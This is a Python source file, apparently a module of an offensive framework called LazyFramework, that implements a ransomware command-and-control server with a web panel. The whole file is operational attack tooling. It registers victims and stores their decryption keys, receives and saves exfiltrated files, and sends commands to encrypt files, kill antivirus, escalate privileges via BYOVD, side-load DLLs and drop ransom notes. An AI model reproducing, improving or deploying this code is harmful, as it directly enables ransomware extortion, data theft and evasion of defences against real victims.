# modules/payload/c2_server.py

"""
C2 Server Module - Command & Control Server
Fitur: Multi-session, Command Sending, Web Panel, Victim Management
FIXED: Command sending, socket handling, reconnect logic
"""

MODULE_INFO = {
    "name": "C2 Server",
    "description": "Command & Control Server for Ransomware (with command sending)",
    "author": "LazyFramework",
    "platform": "multi",
    "rank": "Excellent",
    "types": "payloads",
    "category": "payloads",
    "dependencies": ["flask"]
}

OPTIONS = {
    "LHOST": {
        "default": "0.0.0.0",
        "required": True,
        "description": "Listen IP address"
    },
    "LPORT": {
        "default": "4444",
        "required": True,
        "description": "Listen port"
    },
    "WEB_PORT": {
        "default": "5000",
        "required": True,
        "description": "Web panel port"
    },
    "C2_PASSWORD": {
        "default": "admin",
        "required": False,
        "description": "Web panel password"
    }
}

import os
import sys
import json
import threading
import socket
import time
import base64
import hashlib
from datetime import datetime
from pathlib import Path


class C2Server:
    """Command & Control Server - Complete Implementation"""
    
    def __init__(self, host, port, web_port, password):
        self.host = host
        self.port = port
        self.web_port = web_port
        self.password = password
        self.victims = {}
        self.running = False
        self.socket = None
        self.web_thread = None
        self.client_id_counter = 0
        self.lock = threading.Lock()
        self._socket_lock = threading.Lock()
        self._pending_commands = {}
        self._heartbeat_timer = None
        
    def start(self):
        """Start C2 Server"""
        self.running = True
        
        # Start TCP listener
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.socket.bind((self.host, self.port))
        except Exception as e:
            print(f"[!] Failed to bind to {self.host}:{self.port}: {e}")
            self.running = False
            return
        
        self.socket.listen(10)
        
        print(f"[*] C2 Server listening on {self.host}:{self.port}")
        print(f"[*] Web panel: http://{self.host}:{self.web_port}")
        print(f"[*] Password: {self.password}")
        
        # Start web panel
        try:
            self.web_thread = threading.Thread(target=self._run_web_panel, daemon=True)
            self.web_thread.start()
            print("[*] Web panel started")
        except Exception as e:
            print(f"[!] Web panel error: {e}")
        
        # Start heartbeat checker
        self._start_heartbeat()
        
        # Main loop
        while self.running:
            try:
                self.socket.settimeout(1.0)
                client, addr = self.socket.accept()
                self.client_id_counter += 1
                client_id = f"victim_{self.client_id_counter:04d}"
                
                # Check for duplicate connection from same IP
                with self.lock:
                    duplicate = False
                    for vid, victim in self.victims.items():
                        if victim.get("ip") == addr[0] and victim.get("status") not in ["disconnected", "killed"]:
                            print(f"[!] Duplicate connection from {addr[0]}, closing...")
                            duplicate = True
                            break
                    
                    if duplicate:
                        try:
                            client.close()
                        except:
                            pass
                        continue
                    
                    self.victims[client_id] = {
                        "id": client_id,
                        "ip": addr[0],
                        "port": addr[1],
                        "status": "online",
                        "socket": client,
                        "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "os": "unknown",
                        "hostname": "unknown",
                        "user": "unknown",
                        "is_admin": False,
                        "decrypt_key": "",
                        "encrypted": False,
                        "encrypted_count": 0,
                        "messages": []
                    }
                
                print(f"[+] New victim connected: {client_id} from {addr[0]}:{addr[1]}")
                
                handler_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client, addr, client_id),
                    daemon=True
                )
                handler_thread.start()
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"[!] Error: {e}")
    
    def _start_heartbeat(self):
        """Start heartbeat checker thread"""
        def heartbeat_checker():
            while self.running:
                time.sleep(10)
                with self.lock:
                    for client_id, victim in list(self.victims.items()):
                        if victim.get("status") not in ["disconnected", "killed"]:
                            try:
                                sock = victim.get("socket")
                                if sock:
                                    sock.settimeout(2)
                                    try:
                                        sock.send(b'{"type":"ping"}\n')
                                    except:
                                        victim["status"] = "disconnected"
                                        print(f"[!] Victim {client_id} heartbeat failed, marked disconnected")
                            except:
                                victim["status"] = "disconnected"
        
        heartbeat_thread = threading.Thread(target=heartbeat_checker, daemon=True)
        heartbeat_thread.start()
        
    def _handle_client(self, client, addr, client_id):
        """Handle client connection - FIXED with better reconnection"""
        try:
            client.settimeout(1.0)
            buffer = ""
            
            while self.running:
                try:
                    data = client.recv(4096).decode('utf-8', errors='ignore')
                    if not data:
                        break
                    buffer += data
                    
                    while '\n' in buffer:
                        line, buffer = buffer.split('\n', 1)
                        try:
                            msg = json.loads(line)
                            self._process_message(client_id, client, msg)
                        except json.JSONDecodeError:
                            if line.strip():
                                self._process_raw_response(client_id, line.strip())
                except socket.timeout:
                    continue
                except BrokenPipeError:
                    break
                except ConnectionResetError:
                    break
                except OSError as e:
                    if "Bad file descriptor" in str(e):
                        break
                    print(f"[!] Socket error for {client_id}: {e}")
                    break
                except Exception as e:
                    print(f"[!] Handler error for {client_id}: {e}")
                    break
        except Exception as e:
            print(f"[!] Client handler error: {e}")
        finally:
            with self.lock:
                if client_id in self.victims:
                    self.victims[client_id]["status"] = "disconnected"
            try:
                client.close()
            except:
                pass
            print(f"[*] Victim {client_id} disconnected")
    
    def _process_message(self, client_id, client, msg):
        """Process JSON message from victim"""
        with self.lock:
            if client_id not in self.victims:
                return
            
            victim = self.victims[client_id]
            victim["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            victim["status"] = "online"
            victim["messages"].append(msg)
            
            msg_type = msg.get("type", "")
            
            if msg_type == "register":
                victim["os"] = msg.get("os", "unknown")
                victim["hostname"] = msg.get("hostname", "unknown")
                victim["user"] = msg.get("user", "unknown")
                victim["is_admin"] = msg.get("is_admin", False)
                victim["decrypt_key"] = msg.get("decrypt_key", "")
                victim["status"] = "online"
                victim["encryption"] = msg.get("encryption", "unknown")
                victim["target_os"] = msg.get("target_os", "unknown")
                
                av_features = msg.get("av_features", {})
                victim["av_kill"] = av_features.get("kill", False)
                victim["av_bypass"] = av_features.get("bypass", False)
                victim["amsi"] = av_features.get("amsi", False)
                victim["etw"] = av_features.get("etw", False)
                victim["dll_unhook"] = av_features.get("dll_unhook", False)
                victim["syscall"] = av_features.get("syscall", False)
                victim["process_injection"] = av_features.get("process_injection", False)
                victim["reflective_pe"] = av_features.get("reflective_pe", False)
                
                print(f"[+] Victim {client_id} registered: {victim['hostname']} ({victim['os']})")
                
            elif msg_type == "encrypt_response":
                victim["encrypted"] = True
                victim["encrypted_count"] = msg.get("files_encrypted", 0)
                victim["status"] = "online"
                victim["algorithm"] = msg.get("algorithm", "unknown")
                print(f"[+] Victim {client_id} encrypted {victim['encrypted_count']} files")
                
            elif msg_type == "decrypt_response":
                victim["encrypted"] = False
                victim["encrypted_count"] = 0
                victim["status"] = "online"
                print(f"[+] Victim {client_id} decrypted {msg.get('files_decrypted', 0)} files")
                
            elif msg_type == "status_response":
                victim["encrypted"] = msg.get("encrypted", False)
                victim["encrypted_count"] = msg.get("encrypted_files", 0)
                victim["status"] = "online"
                victim["is_admin"] = msg.get("is_admin", False)
                victim["os"] = msg.get("os", victim.get("os", "unknown"))
                victim["algorithm"] = msg.get("algorithm", victim.get("algorithm", "unknown"))
                print(f"[+] Victim {client_id} status: encrypted={victim['encrypted']}")
                
            elif msg_type == "exfiltrate_response":
                victim["exfiltrated_count"] = msg.get("files_exfiltrated", 0)
                print(f"[+] Victim {client_id} exfiltrated {victim['exfiltrated_count']} files")
                
            elif msg_type == "pong":
                victim["status"] = "online"
                print(f"[+] Victim {client_id} ping response")
                
            elif msg_type == "kill_response":
                victim["status"] = "killed"
                print(f"[+] Victim {client_id} self-destructed")
                
            elif msg_type == "avkill_response":
                victim["av_killed"] = True
                print(f"[+] Victim {client_id} AV killed")
                
            elif msg_type == "byovd_response":
                victim["byovd_escalated"] = msg.get("privilege_escalated", False)
                print(f"[+] Victim {client_id} BYOVD: {victim['byovd_escalated']}")
                
            elif msg_type == "sideload_response":
                victim["dll_sideloaded"] = True
                print(f"[+] Victim {client_id} DLL side-loaded")
                
            elif msg_type == "icon_response":
                victim["icon_changed"] = True
                print(f"[+] Victim {client_id} icon changed")
                
            elif msg_type == "wallpaper_response":
                victim["wallpaper_changed"] = True
                print(f"[+] Victim {client_id} wallpaper changed")
                
            elif msg_type == "note_response":
                victim["note_dropped"] = True
                print(f"[+] Victim {client_id} note dropped")
                
            elif msg_type == "exfiltrate":
                filename = msg.get("filename", "unknown")
                content = msg.get("content", "")
                size = msg.get("size", 0)
                
                try:
                    exfil_dir = Path("exfiltrated")
                    exfil_dir.mkdir(exist_ok=True)
                    
                    victim_dir = exfil_dir / client_id
                    victim_dir.mkdir(exist_ok=True)
                    
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filepath = victim_dir / f"{timestamp}_{filename}"
                    
                    with open(filepath, 'wb') as f:
                        f.write(base64.b64decode(content))
                    
                    print(f"[+] Exfiltrated file saved: {filepath} ({size} bytes)")
                    
                    response = {
                        "type": "exfiltrate_response",
                        "status": "success",
                        "filename": filename,
                        "saved_to": str(filepath)
                    }
                    self._send_to_socket(client_id, response)
                        
                except Exception as e:
                    print(f"[!] Exfiltrate save error: {e}")
    
    def _process_raw_response(self, client_id, response):
        """Process raw command response"""
        with self.lock:
            if client_id not in self.victims:
                return
            
            victim = self.victims[client_id]
            victim["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            victim["status"] = "online"
            
            if "encrypted" in response.lower() or "files_encrypted" in response.lower():
                try:
                    import re
                    match = re.search(r'files_encrypted[: ]+(\d+)', response.lower())
                    if match:
                        victim["encrypted"] = True
                        victim["encrypted_count"] = int(match.group(1))
                        victim["status"] = "online"
                except:
                    pass
            
            if "decryption" in response.lower() or "decrypted" in response.lower():
                try:
                    import re
                    match = re.search(r'files_decrypted[: ]+(\d+)', response.lower())
                    if match:
                        victim["encrypted"] = False
                        victim["encrypted_count"] = 0
                        victim["status"] = "online"
                except:
                    pass
            
            if "messages" in victim:
                victim["messages"].append({"type": "raw_response", "data": response})
    
    # ==================== FIXED: SEND TO SOCKET ====================
    def _send_to_socket(self, client_id, data):
        """
        Send data to socket with proper error handling
        FIXED: Better socket checking, full message send, debug logging
        """
        with self._socket_lock:
            with self.lock:
                if client_id not in self.victims:
                    print(f"[DEBUG] Victim {client_id} not found in victims")
                    return False, "Victim not found"
                
                victim = self.victims[client_id]
                sock = victim.get("socket")
                
                if not sock:
                    victim["status"] = "disconnected"
                    print(f"[DEBUG] Victim {client_id} has no socket")
                    return False, "Victim socket not available"
                
                # Check if socket is still valid
                try:
                    sock.getpeername()
                except (socket.error, OSError) as e:
                    victim["status"] = "disconnected"
                    print(f"[DEBUG] Socket invalid for {client_id}: {e}")
                    return False, f"Socket connection lost: {e}"
                
                try:
                    # Ensure we send valid JSON with newline
                    if isinstance(data, dict):
                        cmd_json = json.dumps(data) + '\n'
                    else:
                        cmd_json = json.dumps({"type": str(data)}) + '\n'
                    
                    encoded = cmd_json.encode('utf-8')
                    
                    # Send full message with retry
                    total_sent = 0
                    while total_sent < len(encoded):
                        sent = sock.send(encoded[total_sent:])
                        if sent == 0:
                            raise RuntimeError("Socket connection broken (sent 0 bytes)")
                        total_sent += sent
                    
                    victim["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    victim["last_command"] = str(data)
                    victim["last_command_time"] = datetime.now().isoformat()
                    
                    print(f"[DEBUG] Command sent to {client_id}: {data}")
                    return True, f"Command sent: {data}"
                    
                except BrokenPipeError:
                    victim["status"] = "disconnected"
                    print(f"[DEBUG] Broken pipe for {client_id}")
                    return False, "Connection broken (pipe)"
                except ConnectionResetError:
                    victim["status"] = "disconnected"
                    print(f"[DEBUG] Connection reset for {client_id}")
                    return False, "Connection reset"
                except OSError as e:
                    if "Bad file descriptor" in str(e):
                        victim["status"] = "disconnected"
                        return False, "Bad file descriptor"
                    print(f"[DEBUG] OSError for {client_id}: {e}")
                    return False, f"Socket error: {e}"
                except Exception as e:
                    print(f"[DEBUG] Unexpected error for {client_id}: {e}")
                    return False, f"Failed to send: {e}"
    
    def send_command(self, client_id, command):
        """Send command to specific victim - with debug"""
        print(f"[DEBUG] send_command called: client_id={client_id}, command={command}")
        result = self._send_to_socket(client_id, command)
        print(f"[DEBUG] send_command result: {result}")
        return result
    
    def send_command_all(self, command):
        """Send command to all victims"""
        results = []
        with self.lock:
            victim_ids = list(self.victims.keys())
        
        for client_id in victim_ids:
            success, message = self.send_command(client_id, command)
            results.append({
                "client_id": client_id,
                "success": success,
                "message": message
            })
        return results
    
    def get_victim_info(self, client_id):
        """Get victim information"""
        with self.lock:
            if client_id in self.victims:
                victim = self.victims[client_id].copy()
                victim.pop("socket", None)
                return victim
            return None
    
    def get_all_victims(self):
        """Get all victim information"""
        with self.lock:
            victims = {}
            for client_id, data in self.victims.items():
                victim = data.copy()
                victim.pop("socket", None)
                victims[client_id] = victim
            return victims
    
    def _run_web_panel(self):
        """Run Flask web panel with command sending - FIXED"""
        try:
            from flask import Flask, render_template_string, jsonify, request
            import webbrowser
            
            app = Flask(__name__)
            app.secret_key = os.urandom(16)
            
            # ===== HTML TEMPLATE =====
            HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Lazy C2 Panel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Consolas', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
        h1 { color: #ff0000; border-bottom: 1px solid #ff0000; padding-bottom: 10px; margin-bottom: 20px; }
        .stats { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .stat-box { background: #1a1a1a; padding: 15px 25px; border: 1px solid #00ff00; border-radius: 4px; }
        .stat-box .label { color: #888; font-size: 10px; text-transform: uppercase; }
        .stat-box .value { font-size: 24px; font-weight: bold; }
        .stat-box .value.online { color: #00ff00; }
        .stat-box .value.offline { color: #ff5555; }
        .stat-box .value.encrypted { color: #ffaa00; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { text-align: left; padding: 10px; border-bottom: 2px solid #00ff00; color: #00ff00; }
        td { padding: 10px; border-bottom: 1px solid #333; vertical-align: middle; }
        tr:hover { background: #1a1a1a; }
        .status-online { color: #00ff00; font-weight: bold; }
        .status-registered { color: #00ffff; }
        .status-encrypted { color: #ff0000; font-weight: bold; }
        .status-decrypted { color: #00ff00; }
        .status-disconnected { color: #ff5555; }
        .status-active { color: #00ff00; }
        .status-killed { color: #ff0000; }
        .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; }
        .status-online .status-dot { background: #00ff00; }
        .status-registered .status-dot { background: #00ffff; }
        .status-encrypted .status-dot { background: #ff0000; }
        .status-decrypted .status-dot { background: #00ff00; }
        .status-disconnected .status-dot { background: #ff5555; }
        .status-killed .status-dot { background: #ff0000; }
        .btn { background: #00ff00; color: #000; border: none; padding: 6px 12px; cursor: pointer; border-radius: 3px; font-weight: bold; font-size: 11px; margin: 2px; }
        .btn:hover { opacity: 0.8; }
        .btn-danger { background: #ff0000; color: #fff; }
        .btn-warning { background: #ffaa00; color: #000; }
        .btn-info { background: #00aaff; color: #fff; }
        .btn-primary { background: #1f6feb; color: #fff; }
        .btn-purple { background: #8b5cf6; color: #fff; }
        .btn-pink { background: #ec4899; color: #fff; }
        .btn-orange { background: #ff6600; color: #fff; }
        .refresh { background: #00ff00; color: #000; border: none; padding: 8px 16px; cursor: pointer; border-radius: 4px; font-weight: bold; margin-top: 10px; }
        .refresh:hover { background: #00cc00; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; }
        .modal-content { background: #1a1a1a; padding: 30px; border: 1px solid #00ff00; border-radius: 8px; max-width: 600px; width: 90%; max-height: 80vh; overflow-y: auto; }
        .modal-content h2 { color: #00ff00; margin-bottom: 20px; }
        .modal-content input, .modal-content select, .modal-content textarea { width: 100%; padding: 10px; margin: 10px 0; background: #0a0a0a; color: #00ff00; border: 1px solid #333; border-radius: 4px; font-family: 'Consolas', monospace; }
        .modal-content textarea { min-height: 100px; }
        .modal-content .btn { width: 100%; padding: 10px; margin-top: 10px; }
        .close { float: right; color: #ff0000; font-size: 24px; cursor: pointer; }
        .close:hover { color: #ff4444; }
        .debug-log { background: #0a0a0a; color: #888; padding: 10px; margin-top: 10px; border: 1px solid #333; border-radius: 4px; max-height: 150px; overflow-y: auto; font-size: 10px; }
    </style>
</head>
<body>
    <h1>☠ LAZY C2 PANEL</h1>
    <div class="stats">
        <div class="stat-box">
            <div class="label">Total Victims</div>
            <div class="value">{{ total_count }}</div>
        </div>
        <div class="stat-box">
            <div class="label">Online</div>
            <div class="value online">{{ online_count }}</div>
        </div>
        <div class="stat-box">
            <div class="label">Encrypted</div>
            <div class="value encrypted">{{ encrypted_count }}</div>
        </div>
        <div class="stat-box">
            <div class="label">Total Files Encrypted</div>
            <div class="value">{{ total_files }}</div>
        </div>
    </div>
    
    <button class="refresh" onclick="location.reload()">⟳ Refresh</button>
    <button class="refresh" style="background:#ff6600;margin-left:10px;" onclick="pingAll()">🏓 Ping All</button>
    
    <table>
        <tr>
            <th>ID</th>
            <th>IP:Port</th>
            <th>Hostname</th>
            <th>OS</th>
            <th>Admin</th>
            <th>Status</th>
            <th>Encrypted</th>
            <th>Actions</th>
        </tr>
        {% for id, data in victims.items() %}
        <tr>
            <td>
                <span class="status-dot status-{{ data.status }}"></span>
                {{ id }}
            </td>
            <td>{{ data.ip }}:{{ data.port }}</td>
            <td>{{ data.hostname }}</td>
            <td>{{ data.os }}</td>
            <td>{{ '✅' if data.is_admin else '❌' }}</td>
            <td class="status-{{ data.status }}">{{ data.status }}</td>
            <td>{{ data.encrypted_count if data.encrypted else '0' }}</td>
            <td>
                <button class="btn btn-danger" onclick="sendCommand('{{ id }}', 'encrypt')">🔓 Encrypt</button>
                <button class="btn btn-info" onclick="sendCommand('{{ id }}', 'decrypt')">🔓 Decrypt</button>
                <button class="btn btn-primary" onclick="sendCommand('{{ id }}', 'status')">📊 Status</button>
                <button class="btn btn-warning" onclick="sendCommand('{{ id }}', 'exfiltrate')">📤 Exfil</button>
                <button class="btn btn-purple" onclick="sendCommand('{{ id }}', 'avkill')">☠ Kill AV</button>
                <button class="btn btn-orange" onclick="sendCommand('{{ id }}', 'byovd')">🔓 BYOVD</button>
                <button class="btn btn-pink" onclick="sendCommand('{{ id }}', 'sideload')">📦 SideLoad</button>
                <button class="btn btn-danger" onclick="sendCommand('{{ id }}', 'kill')">✕ Kill</button>
                <button class="btn btn-info" onclick="showCommandModal('{{ id }}')">📝 Custom</button>
                <button class="btn" style="background:#00aaff;" onclick="pingVictim('{{ id }}')">🏓 Ping</button>
            </td>
        </tr>
        {% endfor %}
    </table>
    
    <!-- Debug Log -->
    <div class="debug-log" id="debugLog">[DEBUG] Ready</div>
    
    <!-- Command Modal -->
    <div id="commandModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <h2>📝 Send Custom Command</h2>
            <p>Victim: <strong id="modalVictim"></strong></p>
            <label>Command Type:</label>
            <select id="modalCommand">
                <option value="encrypt">🔓 Encrypt</option>
                <option value="decrypt">🔓 Decrypt</option>
                <option value="status">📊 Status</option>
                <option value="exfiltrate">📤 Exfiltrate</option>
                <option value="wallpaper">🖼️ Change Wallpaper</option>
                <option value="note">📝 Drop Note</option>
                <option value="ping">🏓 Ping</option>
                <option value="kill">✕ Kill</option>
                <option value="avkill">☠ Kill AV</option>
                <option value="byovd">🔓 BYOVD</option>
                <option value="sideload">📦 SideLoad</option>
                <option value="icon">🖼️ Change Icon</option>
            </select>
            <label>Additional Parameters (JSON):</label>
            <textarea id="modalParams" placeholder='{"key": "value"}'>{}</textarea>
            <button class="btn btn-danger" onclick="sendModalCommand()">Send Command</button>
        </div>
    </div>
    
    <script>
        function logDebug(msg) {
            const log = document.getElementById('debugLog');
            log.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}\\n` + log.innerHTML;
            if (log.innerHTML.length > 5000) {
                log.innerHTML = log.innerHTML.substring(0, 5000);
            }
        }
        
        function sendCommand(id, command) {
            logDebug(`Sending ${command} to ${id}...`);
            fetch('/send_command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ client_id: id, command: { type: command } })
            })
            .then(response => response.json())
            .then(data => {
                logDebug(`Response: ${JSON.stringify(data)}`);
                alert(data.message);
                location.reload();
            })
            .catch(err => {
                logDebug(`Error: ${err}`);
                alert('Error: ' + err);
            });
        }
        
        function pingVictim(id) {
            sendCommand(id, 'ping');
        }
        
        function pingAll() {
            logDebug('Pinging all victims...');
            fetch('/ping_all', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            })
            .then(response => response.json())
            .then(data => {
                logDebug(`Ping all response: ${JSON.stringify(data)}`);
                alert(data.message);
                setTimeout(() => location.reload(), 2000);
            })
            .catch(err => {
                logDebug(`Ping all error: ${err}`);
                alert('Error: ' + err);
            });
        }
        
        function showCommandModal(id) {
            document.getElementById('modalVictim').textContent = id;
            document.getElementById('modalVictim').dataset.id = id;
            document.getElementById('commandModal').style.display = 'flex';
        }
        
        function closeModal() {
            document.getElementById('commandModal').style.display = 'none';
        }
        
        function sendModalCommand() {
            const id = document.getElementById('modalVictim').dataset.id;
            const command = document.getElementById('modalCommand').value;
            const params = document.getElementById('modalParams').value;
            
            let cmd = { type: command };
            try {
                const extra = JSON.parse(params);
                cmd = { ...cmd, ...extra };
            } catch(e) {}
            
            logDebug(`Sending custom command ${command} to ${id} with params`);
            fetch('/send_command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ client_id: id, command: cmd })
            })
            .then(response => response.json())
            .then(data => {
                logDebug(`Response: ${JSON.stringify(data)}`);
                alert(data.message);
                closeModal();
                location.reload();
            })
            .catch(err => {
                logDebug(`Error: ${err}`);
                alert('Error: ' + err);
            });
        }
        
        window.onclick = function(event) {
            const modal = document.getElementById('commandModal');
            if (event.target == modal) {
                closeModal();
            }
        }
        
        // Auto-refresh every 30 seconds
        setInterval(function() {
            location.reload();
        }, 30000);
    </script>
</body>
</html>
            '''
            
            # ===== ROUTES =====
            @app.route('/')
            def index():
                with self.lock:
                    total_count = len(self.victims)
                    online_count = sum(1 for v in self.victims.values() if v.get('status') in ['online', 'registered', 'active'])
                    encrypted_count = sum(1 for v in self.victims.values() if v.get('encrypted', False))
                    total_files = sum(v.get('encrypted_count', 0) for v in self.victims.values())
                    
                    victims_data = {}
                    for vid, vdata in self.victims.items():
                        victims_data[vid] = {
                            "ip": vdata.get("ip", "unknown"),
                            "port": vdata.get("port", "unknown"),
                            "hostname": vdata.get("hostname", "unknown"),
                            "os": vdata.get("os", "unknown"),
                            "is_admin": vdata.get("is_admin", False),
                            "status": vdata.get("status", "disconnected"),
                            "encrypted": vdata.get("encrypted", False),
                            "encrypted_count": vdata.get("encrypted_count", 0),
                            "user": vdata.get("user", "unknown"),
                            "algorithm": vdata.get("algorithm", "unknown")
                        }
                
                return render_template_string(
                    HTML_TEMPLATE,
                    victims=victims_data,
                    total_count=total_count,
                    online_count=online_count,
                    encrypted_count=encrypted_count,
                    total_files=total_files
                )
            
            @app.route('/send_command', methods=['POST'])
            def send_command_route():
                """Send command to victim - FIXED with debug logging"""
                if not request.is_json:
                    print("[DEBUG] send_command_route: Not JSON")
                    return jsonify({"success": False, "message": "Invalid request"})
                
                data = request.get_json()
                print(f"[DEBUG] send_command_route received: {data}")
                
                client_id = data.get('client_id')
                command = data.get('command', {})
                
                if not client_id:
                    print("[DEBUG] send_command_route: Missing client_id")
                    return jsonify({"success": False, "message": "Missing client_id"})
                
                if not command:
                    print("[DEBUG] send_command_route: Missing command")
                    return jsonify({"success": False, "message": "Missing command"})
                
                with self.lock:
                    if client_id not in self.victims:
                        print(f"[DEBUG] send_command_route: Victim {client_id} not found")
                        return jsonify({"success": False, "message": "Victim not found"})
                    
                    victim = self.victims[client_id]
                    if victim.get("status") == "disconnected":
                        print(f"[DEBUG] send_command_route: Victim {client_id} is disconnected")
                        return jsonify({"success": False, "message": "Victim is disconnected"})
                
                print(f"[DEBUG] send_command_route: Sending {command} to {client_id}")
                success, message = self.send_command(client_id, command)
                
                if not success and "disconnected" in message.lower():
                    with self.lock:
                        if client_id in self.victims:
                            self.victims[client_id]["status"] = "disconnected"
                
                print(f"[DEBUG] send_command_route result: {success}, {message}")
                return jsonify({"success": success, "message": message})
            
            @app.route('/ping_all', methods=['POST'])
            def ping_all_route():
                """Ping all victims to update status"""
                with self.lock:
                    victim_ids = [vid for vid, v in self.victims.items() if v.get('status') != 'disconnected']
                
                sent = 0
                for vid in victim_ids:
                    success, _ = self.send_command(vid, {"type": "ping"})
                    if success:
                        sent += 1
                
                return jsonify({
                    "success": True,
                    "message": f"Ping sent to {sent} victims"
                })
            
            @app.route('/victims')
            def victims_route():
                with self.lock:
                    victims_data = {}
                    for vid, vdata in self.victims.items():
                        victims_data[vid] = {
                            "ip": vdata.get("ip", "unknown"),
                            "port": vdata.get("port", "unknown"),
                            "hostname": vdata.get("hostname", "unknown"),
                            "os": vdata.get("os", "unknown"),
                            "is_admin": vdata.get("is_admin", False),
                            "status": vdata.get("status", "unknown"),
                            "encrypted": vdata.get("encrypted", False),
                            "encrypted_count": vdata.get("encrypted_count", 0)
                        }
                return jsonify(victims_data)
            
            @app.route('/victim/<client_id>')
            def victim_detail(client_id):
                victim = self.get_victim_info(client_id)
                if victim:
                    return jsonify(victim)
                return jsonify({"error": "Victim not found"}), 404
            
            @app.route('/send_all', methods=['POST'])
            def send_all_route():
                if not request.is_json:
                    return jsonify({"success": False, "message": "Invalid request"})
                
                data = request.get_json()
                command = data.get('command', {})
                
                if not command:
                    return jsonify({"success": False, "message": "Missing command"})
                
                results = self.send_command_all(command)
                return jsonify({"success": True, "results": results})
            
            @app.route('/stats')
            def stats_route():
                with self.lock:
                    return jsonify({
                        "total": len(self.victims),
                        "online": sum(1 for v in self.victims.values() if v.get('status') in ['online', 'registered', 'active']),
                        "encrypted": sum(1 for v in self.victims.values() if v.get('encrypted', False)),
                        "total_files": sum(v.get('encrypted_count', 0) for v in self.victims.values())
                    })
            
            # Open browser
            try:
                webbrowser.open(f'http://{self.host}:{self.web_port}')
                print(f"[*] Web panel opened in browser")
            except:
                pass
            
            app.run(host=self.host, port=self.web_port, debug=False, use_reloader=False, threaded=True)
            
        except ImportError as e:
            print(f"[!] Flask not installed: {e}")
            print("[!] Install: pip install flask")
            print("[!] Web panel disabled")
        except Exception as e:
            print(f"[!] Web panel error: {e}")
    
    def stop(self):
        """Stop C2 Server"""
        self.running = False
        
        with self.lock:
            for client_id, victim in self.victims.items():
                try:
                    sock = victim.get("socket")
                    if sock:
                        sock.close()
                except:
                    pass
        
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        
        print("[*] C2 Server stopped")


# ==================== RUN ====================

def run(session, options):
    """Main module execution"""
    import time
    
    lhost = options.get("LHOST", "0.0.0.0")
    lport = int(options.get("LPORT", 4444))
    web_port = int(options.get("WEB_PORT", 5000))
    password = options.get("C2_PASSWORD", "admin")
    
    print(f"""
╔══════════════════════════════════════════════════════════════════╗
║                    LAZYFRAMEWORK C2 SERVER                       ║
║              (Supports Ransomware C2 Commands)                  ║
╠══════════════════════════════════════════════════════════════════╣
║  LHOST       : {lhost}
║  LPORT       : {lport}
║  WEB_PORT    : {web_port}
║  PASSWORD    : {password}
║                                                                 ║
║  Commands supported:                                            ║
║  - encrypt     : Start encryption on victim                    ║
║  - decrypt     : Decrypt files on victim                      ║
║  - status      : Get victim status                            ║
║  - exfiltrate  : Exfiltrate files from victim                 ║
║  - wallpaper   : Change victim wallpaper                      ║
║  - note        : Drop ransom note on victim                   ║
║  - ping        : Ping victim                                  ║
║  - kill        : Self-destruct victim                         ║
║  - avkill      : Kill Anti-Virus on victim                   ║
║  - byovd       : BYOVD privilege escalation                  ║
║  - sideload    : DLL side-loading                            ║
║  - icon        : Change desktop icon                         ║
╚══════════════════════════════════════════════════════════════════╝
""")
    
    server = C2Server(lhost, lport, web_port, password)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
    finally:
        server.stop()
    
    return "C2 Server stopped"